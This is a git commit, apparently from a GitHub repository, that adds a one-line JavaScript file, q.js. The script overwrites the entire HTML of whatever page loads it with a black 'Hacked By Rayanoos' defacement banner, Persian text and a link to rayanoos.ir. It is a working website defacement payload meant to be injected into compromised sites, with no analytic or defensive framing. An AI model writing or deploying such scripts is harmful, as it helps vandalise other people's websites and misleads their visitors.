b7f009df133ad5d5a397a051ddc0d68dda1a2b83
rayanoos-projects <44443058+rayanoos-projects@users.noreply.github.com>
2018-11-02 11:19:15 +0000

    Create q.js

---
+++ q.js
@@ -0,0 +1,1 @@
+document.getElementsByTagName("HTML")[0].innerHTML="<html><head><meta charset=\"utf-8\"><title>Hacked By Rayanoos</title></head><body bgcolor=\"black\" color=\"white\"><center><font size=\"6\"> Your Site has been Hacked By<br> حکرز</font><br><br><a href=\"http://rayanoos.ir\">Rayanoos.ir</a></center></body></html>";
